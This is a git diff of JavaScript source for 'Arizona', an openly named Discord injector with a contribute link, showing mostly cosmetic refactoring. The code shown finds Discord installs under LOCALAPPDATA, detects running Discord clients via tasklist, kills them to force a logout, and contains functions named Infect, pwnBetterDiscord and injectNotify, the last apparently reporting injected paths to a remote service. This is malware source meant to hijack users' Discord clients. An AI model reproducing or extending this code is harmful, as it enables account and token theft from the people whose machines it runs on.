@@ -4,7 +4,7 @@
 /* 
     Creators: Stanley-GF & bytixo
     Project Name: Arizona
-    Languages: JS, JS (C# injectors can be found on Github)
+    Languages: JS, JS, RS (C# injectors can be found on Github)
     Contribute: https://github.com/Stanley-GF/Arizona
 */
 
@@ -27,7 +27,6 @@ var LOCAL = process.env.LOCALAPPDATA
 var discords = [];
 var injectPath = [];
 var runningDiscords = [];
-
 
 fs.readdirSync(LOCAL).forEach(file => {
     if (file.includes("iscord")) {
@@ -83,27 +82,13 @@ function Infect() {
     });
 };
 
-
 function listDiscords() {
     exec('tasklist', function(err,stdout, stderr) {
+        if (stdout.includes("Discord.exe")) runningDiscords.push("discord");
+        if (stdout.includes("DiscordCanary.exe")) runningDiscords.push("discordcanary");
+        if (stdout.includes("DiscordDevelopment.exe")) runningDiscords.push("discorddevelopment");
+        if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("discordptb");
 
-        
-        if (stdout.includes("Discord.exe")) {
-
-            runningDiscords.push("discord")
-        }
-        if (stdout.includes("DiscordCanary.exe")) {
-
-            runningDiscords.push("discordcanary")
-        }
-        if (stdout.includes("DiscordDevelopment.exe")) {
-
-            runningDiscords.push("discorddevelopment")
-        }
-        if (stdout.includes("DiscordPTB.exe")) {
-
-            runningDiscords.push("discordptb")
-        };
         if (config.logout == "instant") {
             killDiscord();
         } else {
@@ -114,9 +99,6 @@ function listDiscords() {
             pwnBetterDiscord()
         }
     })
-
-
-   
 };
 
 function killDiscord() {
@@ -156,7 +138,6 @@ function pwnBetterDiscord() {
 
 }
 
-
 function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
@@ -189,5 +170,4 @@ function injectNotify() {
 	.catch(error => {
 
     })
-
 }
